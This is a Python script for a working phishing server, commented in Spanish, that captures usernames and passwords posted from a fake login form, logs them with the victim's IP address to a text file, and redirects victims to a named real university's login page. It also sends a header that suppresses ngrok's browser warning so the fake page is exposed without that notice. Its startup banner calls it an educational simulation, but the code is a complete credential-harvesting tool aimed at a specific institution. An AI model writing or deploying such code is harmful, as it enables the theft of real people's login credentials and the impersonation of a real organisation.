import http.server
import urllib.parse
import datetime
import os

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def end_headers(self):
        # Inyectar la cabecera para saltar la advertencia de Ngrok automáticamente en todas las peticiones
        self.send_header('ngrok-skip-browser-warning', 'true')
        super().end_headers()

    def do_POST(self):
        # Leer los datos enviados por el formulario
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8', errors='ignore')
        params = urllib.parse.parse_qs(post_data)
        
        usuario = params.get('usuario', [''])[0]
        clave = params.get('clave', [''])[0]
        ip = self.client_address[0]
        fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Formatear el registro para guardarlo
        registro = f"Fecha: {fecha} | IP: {ip} | Usuario: {usuario} | Clave: {clave}\n"
        print(f"\n[¡ALERTA! CREDENCIALES CAPTURADAS]: {registro.strip()}")
        
        # Guardar en credenciales.txt
        with open("credenciales.txt", "a", encoding="utf-8") as f:
            f.write(registro)
        
        # Redirigir a la víctima al sitio real de la universidad
        self.send_response(302)
        self.send_header('Location', 'https://sigedin.uniputumayo.edu.co/login')
        self.end_headers()

if __name__ == '__main__':
    server_address = ('0.0.0.0', 8000)
    httpd = http.server.HTTPServer(server_address, PhishingHandler)
    print("==================================================")
    print("  SERVIDOR DE SIMULACIÓN EDUCATIVA ACTIVO")
    print("  Esperando conexiones en la red local...")
    print("==================================================")
    httpd.serve_forever()